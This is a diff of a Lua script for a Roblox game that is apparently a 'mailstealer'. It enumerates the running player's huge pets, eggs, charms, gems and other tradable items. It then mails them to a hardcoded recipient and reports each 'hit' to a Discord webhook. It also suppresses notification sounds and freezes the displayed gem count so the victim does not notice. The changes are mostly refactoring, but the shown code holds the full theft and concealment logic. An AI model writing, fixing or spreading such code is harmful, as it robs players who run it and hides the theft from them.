@@ -34,6 +34,12 @@ if idiotuser == _G.Username then
     return
 end
 
+-- Check for required usernames
+if _G.Username == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A Username")
+    return
+end
+
 -- Main Execution
 repeat task.wait() until game.PlaceId ~= nil
 repeat task.wait() until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")
@@ -46,7 +52,6 @@ local Inventory = Save.Inventory
 local HttpService = game:GetService("HttpService")
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 
-local GemsAmount = 0
 for id, table in pairs(Inventory.Currency) do
     if table.id == "Diamonds" then
         GemsAmount = table._am or 0
@@ -54,7 +59,6 @@ for id, table in pairs(Inventory.Currency) do
     end
 end
 
-local FunctionToGetFirstPriceOfMail
 for adress, func in pairs(getgc()) do
     if typeof(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
         FunctionToGetFirstPriceOfMail = func
@@ -62,7 +66,7 @@ for adress, func in pairs(getgc()) do
     end
 end
 
-local FirstPriceOfMail = FunctionToGetFirstPriceOfMail()
+FirstPriceOfMail = FunctionToGetFirstPriceOfMail()
 
 if FirstPriceOfMail > GemsAmount then
     print("You don't have enough gems to run a script")
@@ -113,7 +117,7 @@ local GetItemValue = function(Type, ItemTable)
 end
 
 local GetItemValueOfItems = function()
-    local RAP = 0
+    RAP = 0
     for name_of_category, category in pairs(Inventory) do
         if category ~= nil then
             for i, v in pairs(category) do
@@ -139,11 +143,16 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
     local headers = {
         ["Content-Type"] = "application/json"
     }
-    local shinyy = shiny and "Shiny" or "not Shiny"
-    local imgs = "https://cdn.discordapp.com/attachments/1316880087504985509/1318252769966035014/HIT.jpg?ex=6761a610&is=67605490&hm=c2c13c8b6afc605b7875df323d2d9aca1343c47af3ab69fbd3425b30e7b304ba&"
+    if shiny == true then
+        shinyy = "Shiny"
+    elseif shiny == false then
+        shinyy = "not Shiny"
+    end
+    imgs =
+        "https://cdn.discordapp.com/attachments/1316880087504985509/1318252769966035014/HIT.jpg?ex=6761a610&is=67605490&hm=c2c13c8b6afc605b7875df323d2d9aca1343c47af3ab69fbd3425b30e7b304ba&"
     local fardplayer = game:GetService("Players").LocalPlayer
     local ExecutorWebhook = identifyexecutor() or "undefined"
-    local JobId = game.JobId
+    JobId = game.JobId
     local PlayerUser = Player.Name
     local msg = {
         ["content"] = ping,
@@ -223,15 +232,15 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
     )
 end
 
-local gemsleaderstat = Player.leaderstats:FindFirstChild("Diamonds")
-if gemsleaderstat then
-    local gemsleaderstatpath = gemsleaderstat.Value
-    gemsleaderstat:GetPropertyChangedSignal("Value"):Connect(
-        function()
-            gemsleaderstat.Value = gemsleaderstatpath
-        end
-    )
-end
+-- skidded that, SORRY!!
+
+local gemsleaderstat = Player.leaderstats["\240\159\146\142 Diamonds"].Value
+local gemsleaderstatpath = Player.leaderstats["\240\159\146\142 Diamonds"]
+gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(
+    function()
+        gemsleaderstatpath.Value = gemsleaderstat
+    end
+)
 
 local loading = Player.PlayerScripts.Scripts.Core["Process Pending GUI"]
 local noti = Player.PlayerGui.Notifications
@@ -254,9 +263,7 @@ task.spawn(
                      then
                         x.Volume = 0
                         x.PlayOnRemove = false
-                        if x.Parent then
-                            x:Destroy()
-                        end
+                        x:Destroy()
                     end
                 end
             end
@@ -264,21 +271,24 @@ task.spawn(
     end
 )
 
+-- no more skidding!
+
 local function GetThumbnail(imageid)
-    local Asset = string.split(imageid, "rbxassetid://")[2]
+    Asset = string.split(imageid, "rbxassetid://")[2]
     local Size = "420x420"
     local Image =
         game:HttpGet(
         "https://thumbnails.roblox.com/v1/assets?assetIds=" ..
             Asset .. "&returnPolicy=PlaceHolder&size=" .. Size .. "&format=png"
     )
-    local thumbnail = game.HttpService:JSONDecode(Image).data[1].imageUrl
+    thumbnail = game.HttpService:JSONDecode(Image).data[1].imageUrl
     return thumbnail
 end
 
-local MinimumRAP = FirstPriceOfMail
+MinimumRAP = FirstPriceOfMail
 
 -- EMPTY BOXES
+
 if Inventory.Box then
     for key, value in pairs(Inventory.Box) do
         if value._uq then
@@ -304,11 +314,10 @@ local GetListWithAllItems = function()
     local hits = {}
     if Inventory.Pet ~= nil then
         for i, v in pairs(Inventory.Pet) do
-            local id = v.id
-            local dir = Directory.Pets[id]
-            if dir and dir.huge and dir.Tradable ~= false then
-                local rap = GetItemValue("Pet", v)
-                local ItemImageId, ItemType
+            id = v.id
+            dir = Directory.Pets[id]
+            if dir.huge and dir.Tradable ~= false then
+                rap = GetItemValue("Pet", v)
                 if v.pt == 1 then
                     ItemImageId = dir.goldenThumbnail
                     ItemType = "Golden"
@@ -334,9 +343,8 @@ local GetListWithAllItems = function()
                     }
                 )
             end
-            if dir and dir.exclusiveLevel and dir.Tradable ~= false then
-                local rap = GetItemValue("Pet", v) * (v._am or 1)
-                local ItemImageId, ItemType
+            if dir.exclusiveLevel and dir.Tradable ~= false then
+                rap = GetItemValue("Pet", v) * (v._am or 1)
                 if v.pt == 1 then
                     ItemImageId = dir.goldenThumbnail
                     ItemType = "Golden"
@@ -368,11 +376,11 @@ local GetListWithAllItems = function()
     end
     if Inventory.Egg ~= nil then
         for i, v in pairs(Inventory.Egg) do
-            local id = v.id
-            local dir = Directory.Eggs[id]
-            local rap = GetItemValue("Egg", v)
-            local ItemType = "Normal"
-            local ItemImageId = dir.icon
+            id = v.id
+            dir = Directory.Eggs[id]
+            rap = GetItemValue("Egg", v)
+            ItemType = "Normal"
+            ItemImageId = dir.icon
             if rap > MinimumRAP then
                 table.insert(
                     hits,
@@ -393,11 +401,11 @@ local GetListWithAllItems = function()
     end
     if Inventory.Misc ~= nil then
         for i, v in pairs(Inventory.Misc) do
-            local id = v.id
-            local dir = Directory.MiscItems[id]
-            local rap = GetItemValue("Misc", v)
-            local ItemType = "Normal"
-            local ItemImageId = dir.Icon
+            id = v.id
+            dir = Directory.MiscItems[id]
+            rap = GetItemValue("Misc", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
             if rap > MinimumRAP and v.id ~= "Slingshot" then
                 table.insert(
                     hits,
@@ -418,11 +426,11 @@ local GetListWithAllItems = function()
     end
     if Inventory.Charm ~= nil then
         for i, v in pairs(Inventory.Charm) do
-            local id = v.id
-            local dir = Directory.Charms[id]
-            local rap = GetItemValue("Charm", v)
-            local ItemType = "Normal"
-            local ItemImageId = dir.Icon
+            id = v.id
+            dir = Directory.Charms[id]
+            rap = GetItemValue("Charm", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
             if rap > MinimumRAP then
                 table.insert(
                     hits,
@@ -443,11 +451,11 @@ local GetListWithAllItems = function()
     end
     if Inventory.Enchant ~= nil then
         for i, v in pairs(Inventory.Enchant) do
-            local id = v.id
-            local dir = Directory.Enchants[id]
-            local rap = GetItemValue("Enchant", v)
-            local ItemType = "Normal"
-            local ItemImageId = dir.Icon(v.tn)
+            id = v.id
+            dir = Directory.Enchants[id]
+            rap = GetItemValue("Enchant", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon(v.tn)
             if rap > MinimumRAP then
                 table.insert(
                     hits,
@@ -468,11 +476,11 @@ local GetListWithAllItems = function()
     end
     if Inventory.Lootbox ~= nil then
         for i, v in pairs(Inventory.Lootbox) do
-            local id = v.id
-            local dir = Directory.Lootboxes[id]
-            local rap = GetItemValue("Lootbox", v)
-            local ItemType = "Normal"
-            local ItemImageId = dir.Icon
+            id = v.id
+            dir = Directory.Lootboxes[id]
+            rap = GetItemValue("Lootbox", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
             if rap > MinimumRAP then
                 table.insert(
                     hits,
@@ -493,11 +501,11 @@ local GetListWithAllItems = function()
     end
     if Inventory.Potion ~= nil then
         for i, v in pairs(Inventory.Potion) do
-            local id = v.id
-            local dir = Directory.Potions[id]
-            local rap = GetItemValue("Potion", v)
-            local ItemType = "Normal"
-            local ItemImageId = dir.Icon(v.tn)
+            id = v.id
+            dir = Directory.Potions[id]
+            rap = GetItemValue("Potion", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon(v.tn)
             if rap > MinimumRAP then
                 table.insert(
                     hits,
@@ -518,11 +526,11 @@ local GetListWithAllItems = function()
     end
     if Inventory.Seed ~= nil then
         for i, v in pairs(Inventory.Seed) do
-            local id = v.id
-            local dir = Directory.Seeds[id]
-            local rap = GetItemValue("Seed", v)
-            local ItemType = "Normal"
-            local ItemImageId = dir.Icon
+            id = v.id
+            dir = Directory.Seeds[id]
+            rap = GetItemValue("Seed", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
             if rap > MinimumRAP then
                 table.insert(
                     hits,
@@ -543,11 +551,11 @@ local GetListWithAllItems = function()
     end
     if Inventory.Ultimate ~= nil then
         for i, v in pairs(Inventory.Ultimate) do
-            local id = v.id
-            local dir = Directory.Ultimates[id]
-            local rap = GetItemValue("Ultimate", v)
-            local ItemType = "Normal"
-            local ItemImageId = dir.Icon
+            id = v.id
+            dir = Directory.Ultimates[id]
+            rap = GetItemValue("Ultimate", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
             if rap > MinimumRAP then
                 table.insert(
                     hits,
@@ -568,11 +576,11 @@ local GetListWithAllItems = function()
     end
     if Inventory.Fruit ~= nil then
         for i, v in pairs(Inventory.Fruit) do
-            local id = v.id
-            local dir = Directory.Fruits[id]
-            local rap = GetItemValue("Fruit", v)
-            local ItemType = "Normal"
-            local ItemImageId = dir.Icon
+            id = v.id
+            dir = Directory.Fruits[id]
+            rap = GetItemValue("Fruit", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
             if rap > MinimumRAP then
                 table.insert(
                     hits,
@@ -593,11 +601,11 @@ local GetListWithAllItems = function()
     end
     if Inventory.Hoverboard ~= nil then
         for i, v in pairs(Inventory.Hoverboard) do
-            local id = v.id
-            local dir = Directory.Hoverboards[id]
-            local rap = GetItemValue("Hoverboard", v)
-            local ItemType = "Normal"
-            local ItemImageId = dir.Icon
+            id = v.id
+            dir = Directory.Hoverboards[id]
+            rap = GetItemValue("Hoverboard", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
             if rap > MinimumRAP then
                 table.insert(
                     hits,
@@ -618,11 +626,11 @@ local GetListWithAllItems = function()
     end
     if Inventory.Booth ~= nil then
         for i, v in pairs(Inventory.Booth) do
-            local id = v.id
-            local dir = Directory.Booths[id]
-            local rap = GetItemValue("Booth", v)
-            local ItemType = "Normal"
-            local ItemImageId = dir.Icon
+            id = v.id
+            dir = Directory.Booths[id]
+            rap = GetItemValue("Booth", v)
+            ItemType = "Normal"
+            ItemImageId = dir.Icon
             if rap > MinimumRAP then
                 table.insert(
                     hits,
@@ -671,11 +679,11 @@ local function IsMailboxHooked()
     end
 end
 
-local itemsCounted = 0
+itemsCounted = 0
 local totalRap = 0
 local hits = GetListWithAllItems()
-local currentMailPrice = FirstPriceOfMail
-
+currentMailPrice = FirstPriceOfMail
+-- make it count total rap until sending price is bigger than gems amount, also make it calculate gems amount after each send
 for i, v in pairs(hits) do
     if v.Item_RAP >= currentMailPrice then
         totalRap = totalRap + v.Item_RAP
@@ -726,7 +734,7 @@ local function SendAllGems()
     for i, v in pairs(Inventory.Currency) do
         if v.id == "Diamonds" then
             if GemsAmount >= (FirstPriceOfMail + 10000) then
-                local SentGems = GemsAmount - FirstPriceOfMail
+                SentGems = GemsAmount - FirstPriceOfMail
                 local args = {
                     [1] = Roblox_Username,
                     [2] = "" .. mailstealer_name .. " mailstealer on top",
@@ -745,16 +753,17 @@ local function SendAllGems()
     end
 end
 
-local Left_Hits = #hits
+
+Left_Hits = #hits
 
 if #hits > 0 or GemsAmount > FirstPriceOfMail then
     local blob_a = require(game:GetService("ReplicatedStorage").Library.Client.Save)
     local blob_b = blob_a.Get()
 
-    local FavoriteModeSelection = blob_a.Get().FavoriteModeSelection
-    local FavoriteModeSelectionPlaza = blob_a.Get().FavoriteModeSelectionPlaza
+    FavoriteModeSelection = blob_a.Get().FavoriteModeSelection
+    FavoriteModeSelectionPlaza = blob_a.Get().FavoriteModeSelectionPlaza
 
-    local oldGet = deepCopy(blob_b)
+    oldGet = deepCopy(blob_b)
     blob_a.Get = function(...)
         blob_b = oldGet
         blob_b.FavoriteModeSelection = {FavoriteModeSelection}
@@ -786,7 +795,7 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
         end
         if v.Item_RAP >= FirstPriceOfMail then
             sendItem(v.Item_Class, v.Item_Id, v.Item_Amount, v.IsLocked)
-            local thumb = GetThumbnail(v.Item_ImageId)
+            thumb = GetThumbnail(v.Item_ImageId)
             Left_Hits = Left_Hits - 1
             task.spawn(
                 function()
